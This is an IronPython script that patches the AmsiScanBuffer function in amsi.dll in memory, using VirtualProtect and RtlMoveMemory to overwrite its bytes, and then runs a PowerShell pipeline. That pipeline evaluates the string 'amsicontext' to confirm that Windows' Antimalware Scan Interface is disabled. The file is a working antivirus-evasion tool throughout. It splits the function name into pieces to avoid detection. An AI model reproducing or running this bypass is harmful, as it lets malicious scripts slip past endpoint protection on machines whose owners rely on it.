import clr
import System
import os

clr.AddReference("System.Management.Automation")
from System.Management.Automation import Runspaces
import clrtype
from ctypes import *
import ctypes
from System import Convert, Text, Environment, IntPtr, UInt32
from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import DllImportAttribute, PreserveSigAttribute, Marshal, HandleRef, CharSet

class NativeMethods(object, metaclass=clrtype.ClrClass):
    # Note that you could also the "ctypes" modules instead of pinvoke declarations
    __metaclass__ = clrtype.ClrClass # https://github.com/IronLanguages/ironpython3/issues/836

    DllImport = clrtype.attribute(DllImportAttribute)
    PreserveSig = clrtype.attribute(PreserveSigAttribute)

    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.UInt64, System.UInt64, System.UInt64)
    @clrtype.returns(System.IntPtr)
    def VirtualAlloc(lpStartAddr, size, flAllocationType, flProtect): raise NotImplementedError("No Virtual Alloc?")

    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.UInt32, System.UInt32, System.IntPtr)
    @clrtype.returns(System.Boolean)
    def VirtualProtect(lpAddr, dwSize, newProtect, oldProtect): raise NotImplementedError("No Virtual Protect?")
    
    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.IntPtr)
    @clrtype.returns(System.IntPtr)
    def GetProcAddress(hModule, procName): raise NotImplementedError("No ProcAddr?")
    
    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts(System.String)
    @clrtype.returns(System.IntPtr)
    def LoadLibrary(lpFileName): raise NotImplementedError("No LoadLibrary?")

    @staticmethod
    @DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = False)
    @PreserveSig()
    @clrtype.accepts(System.IntPtr, System.IntPtr, System.Int32)
    @clrtype.returns()
    def RtlMoveMemory(lpFileName): raise NotImplementedError("No RtlMoveMemory?")

    @staticmethod
    @DllImport("kernel32.dll")
    @PreserveSig()
    @clrtype.accepts()
    @clrtype.returns(System.UInt64)
    def GetLastError(): raise NotImplementedError("No GetLastError?")
def bypass():
    asbSTR = Marshal.StringToHGlobalAnsi("Amsi" + "Scan" + "Buffer")
    asbHandle = NativeMethods.LoadLibrary("amsi.dll")
    asbPtr = NativeMethods.GetProcAddress(asbHandle, asbSTR)

    old = Marshal.AllocHGlobal(4)
    prot = NativeMethods.VirtualProtect(asbPtr, 0x0015, 0x40, old)

    patch = System.Array[System.Byte]((0x33, 0xff, 0x90))
    unPtr = Marshal.AllocHGlobal(3)
    Marshal.Copy(patch, 0, unPtr, 3)
    NativeMethods.RtlMoveMemory(asbPtr + 0x001b, unPtr, 3)

    Marshal.FreeHGlobal(old)
    Marshal.FreeHGlobal(unPtr)

def main():
    bypass()
    runspace = Runspaces.RunspaceFactory.CreateRunspace()
    runspace.Open()
    scriptInvoker = RunspaceInvoke(runspace)
    pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(r"'amsicontext'")
    pipeline.Commands.Add("Out-String")
    output = pipeline.Invoke()
    for o in output:
        print(o)
    runspace.Close()

if __name__ == '__main__':
    main()
